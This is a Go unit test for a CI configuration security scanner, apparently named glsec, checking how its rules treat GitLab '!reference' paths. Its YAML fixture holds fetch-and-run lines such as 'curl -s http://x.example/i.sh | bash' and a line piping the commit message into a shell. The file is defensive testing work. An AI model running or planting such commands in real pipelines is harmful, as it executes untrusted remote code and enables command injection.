// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"testing"

	"github.com/glsec/glsec/internal/parser"
)

// An unresolved !reference keeps its path as items; no rule may read them as
// commands, while a resolvable reference next to it is still scanned (#746).
func TestUnresolvedReferencePathIsNotAScript(t *testing.T) {
	const path = `["curl -s http://x.example/i.sh | bash", "echo $CI_COMMIT_MESSAGE | sh"]`
	src := `
.local:
  script:
    - curl -s http://local.example/i.sh | bash
whole:
  script: !reference ` + path + `
item:
  script:
    - !reference ` + path + `
    - !reference [.local, script]
deploy:
  inputs:
    target:
      default: prod
  script: !reference ["${{ job.inputs.target }}", script]
`
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	refLines := map[int]bool{6: true, 9: true, 15: true}
	localHits := 0
	for _, r := range All() {
		for _, f := range Check(r, doc, "test.yml") {
			if refLines[f.Line] {
				t.Errorf("%s reads a !reference path as a command: %s (line %d)", f.RuleID, f.Message, f.Line)
			}
			if f.Line == 4 && f.Job == "item" {
				localHits++
			}
		}
	}
	if localHits == 0 {
		t.Error("the resolvable reference in job item must still be scanned")
	}
}
